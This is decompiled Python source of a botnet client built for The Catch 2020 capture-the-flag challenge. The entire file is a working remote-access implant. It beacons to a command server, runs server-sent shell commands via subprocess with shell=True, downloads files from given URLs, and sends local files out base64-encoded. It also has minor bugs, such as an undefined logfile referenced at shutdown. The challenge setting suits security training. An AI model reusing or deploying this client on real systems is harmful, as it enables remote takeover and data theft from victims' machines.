# uncompyle6 version 3.7.4
# Python bytecode 3.5 (3350)
# Decompiled from: Python 3.8.4 (default, Jul 13 2020, 21:16:07) 
# [GCC 9.3.0]
# Embedded file name: /media/sf_the-catch-2020/the-catch-2020-general/challenges/the_connection/botnet_client.py
"""
The Catch 2020 - Botnet client for "The Connection"
"""
import os, sys, codecs, subprocess, argparse, base64, socket, string, struct, random
from time import sleep
import platform, requests
from getmac import get_mac_address
__author__ = 'Aleš Padrta @ CESNET.CZ'
__version__ = '1.0'

class Message:
    __doc__ = '\n\tBotnet message\n\t'
    plain = ''
    encoded = ''
    sckbuffer = bytearray()

    def __init__(self):
        """
                Constructor
                """
        self.plain = ''
        self.encoded = ''
        self.sckbuffer = bytearray()

    def set_plain(self, msg):
        """
                Initialize with decoded (plain) message
                """
        self.plain = msg
        self.encode_msg()

    def get_plain(self):
        """
                Return decoded (plain) message
                """
        return self.plain

    def set_encoded(self, msg):
        """
                Initialize with encoded message (debug purposes)
                """
        self.encoded = msg
        self.decode_msg()

    def get_encoded(self):
        """
                Return encoded message (debug purposes)
                """
        return self.encoded

    def encode_msg(self):
        """
                Encode plain message
                """
        basemsg = self.plain.encode()
        prefix = struct.pack('>Q', len(basemsg))
        self.encoded = prefix + basemsg

    def decode_msg(self):
        """
                Decode plain message
                """
        prefix = struct.unpack('>Q', self.encoded[0:8])[0]
        basemsg = self.encoded[8:]
        if len(basemsg) != prefix:
            self.plain = ''
            raise Exception('Inconsistence in message')
        self.plain = basemsg.decode()

    def send_msg(self, sck):
        """
                Send encoded message to socket
                """
        try:
            sck.sendall(self.encoded)
        except Exception as exc:
            raise

    def receive_msg(self, sck):
        """
                Receive encoded message from socket
                """
        try:
            raw_msglen = self.receive_all(sck, 8)
            if not raw_msglen:
                return
            else:
                msglen = struct.unpack('>Q', raw_msglen)[0]
                data = self.receive_all(sck, msglen)
                self.encoded = raw_msglen + data
                self.decode_msg()
                return len(self.encoded)
        except Exception:
            return

    def receive_all(self, sck, length):
        """
                Receive specified number of bytes (or return None if EOF is hit)
                """
        self.sckbuffer = bytearray()
        while len(self.sckbuffer) < length:
            packet = sck.recv(length - len(self.sckbuffer))
            if not packet:
                return
            self.sckbuffer.extend(packet)

        return self.sckbuffer


class BotnetClient:
    __doc__ = '\n\tClass for FT2-BotnetClient\n\t'
    client_id = None
    server_ip = ''
    time_out = 5
    server_port = 0
    beacon = 5
    stop = False
    nextmsg = None
    nexttype = None
    sck = None

    def __init__(self, srv_ip, srv_port):
        """
                Constructor
                """
        self.server_ip = srv_ip
        self.server_port = srv_port
        self.generate_id()
        self.beacon = 1
        self.stop = False
        self.time_out = 5
        self.nextmsg = None
        self.nexttype = None
        self.sck = None

    def generate_id(self):
        """
                Generate client ID
                """
        self.client_id = '{}'.format(''.join(random.sample(string.ascii_lowercase + string.digits, k=16)))

    def generate_readymsg(self):
        """
                Generate ready message
                """
        return '{};;ready'.format(self.client_id)

    def get_order(self):
        """
                Beacon and get order from server
                """
        msg = Message()
        msg.set_plain(self.generate_readymsg())
        msg.send_msg(self.sck)
        msg.set_plain('')
        msg.receive_msg(self.sck)
        details = ''
        order = ''
        if msg.get_plain().count(';;') < 1:
            order = msg.get_plain()
        else:
            order, details = msg.get_plain().split(';', 1)
        return (
         order, details)

    def order_execute(self, details):
        """
                Performning command "execute"
                """
        out = None
        err = None
        try:
            proc = subprocess.Popen(details.split(';'), stdout=subprocess.PIPE, shell=True)
            out, err = proc.communicate()
        except Exception:
            pass

        if os.device_encoding(0):
            self.nextmsg = '{};;result-execution;;{} {}'.format(self.client_id, out.decode(os.device_encoding(0)) if out else '', err.decode(os.device_encoding(0)) if err else '')
        else:
            self.nextmsg = '{};;result-execution;;{} {}'.format(self.client_id, out.decode() if out else '', err.decode() if err else '')
        self.nexttype = 'result-execution'

    def order_download(self, details):
        """
                Performning command "download"
                """
        download_file, download_url = details.split(';;', 1)
        response = None
        try:
            response = requests.get(download_url)
        except Exception:
            pass

        if response and response.status_code == 200:
            download_fileh = open(download_file, 'wb')
            download_fileh.write(response.content)
            download_fileh.close()
            self.nextmsg = '{};;info;;download-ok;;{} -> {}'.format(self.client_id, download_url, download_file)
        else:
            self.nextmsg = '{};;info;download-failed;;{}'.format(self.client_id, download_url)
        self.nexttype = 'info'

    def order_upload(self, details):
        """
                Performning command "upload"
                """
        upload_content = None
        try:
            fup = codecs.open(details, 'rb')
            upload_content = base64.b64encode(fup.read()).decode()
            fup.close()
        except Exception:
            pass

        if upload_content:
            self.nextmsg = '{};;file-upload;;{};;{}'.format(self.client_id, details, upload_content)
            self.nexttype = 'file-upload'
        else:
            self.nextmsg = '{};;info;;upload-failed;;{}'.format(self.client_id, details)
            self.nexttype = 'info'

    def sent_data(self):
        """
                Sending data prepared by performing previous order
                """
        msg = Message()
        msg.set_plain(self.nextmsg)
        print('-> Sending data ({})'.format(self.nexttype))
        msg.send_msg(self.sck)
        if self.nexttype in ('result-execution', 'file-upload'):
            msg.set_plain('')
            msg.receive_msg(self.sck)
            print('<- Server reply: {}'.format(msg.get_plain()))
        self.nextmsg = None
        self.nexttype = None

    def run(self):
        """
                Running the botnet client
                """
        msg = Message()
        print('The Catch 2020 Botnet Client started (server on {} port {})'.format(self.server_ip, self.server_port))
        while not self.stop:
            try:
                self.sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sck.settimeout(self.time_out)
                self.sck.connect((self.server_ip, self.server_port))
            except socket.error as excdesc:
                print('Connection failed: {}'.format(excdesc))

            try:
                if not self.nextmsg:
                    order, details = self.get_order()
                    if order == 'wait':
                        self.beacon = int(details)
                    else:
                        if order == 'client-stop':
                            self.stop = True
                            self.sck.close()
                        else:
                            if order == 'execute':
                                self.order_execute(details)
                            else:
                                if order == 'download':
                                    self.order_download(details)
                                else:
                                    if order == 'upload':
                                        self.order_upload(details)
                                    else:
                                        print('Received unknown order')
                else:
                    self.sent_data()
                self.sck.close()
            except Exception:
                pass

            if not self.stop:
                sleep(self.beacon)
                self.beacon = self.beacon * 2.2

        self.logfile.log_entry('The Catch 2020 Botnet Clien stopped', 'info')
        self.logfile.close()


def get_args():
    """
        Cmd line argument parsing (preprocessing)
        """
    parser = argparse.ArgumentParser(description='The Catch 2020 Botnet Client')
    parser.add_argument('-ip', '--ipaddress', type=str, help='Server IP address', required=True)
    parser.add_argument('-p', '--port', type=int, help='Server port', required=True)
    args = parser.parse_args()
    return (
     args.ipaddress, args.port)


def main():
    """
        Main function
        """
    if sys.version_info[0] < 3:
        print('ERROR: Python3 required.')
        exit(1)
    srv_ip, srv_port = get_args()
    client = BotnetClient(srv_ip, srv_port)
    client.run()


main()
# okay decompiling botnet_client.pyc
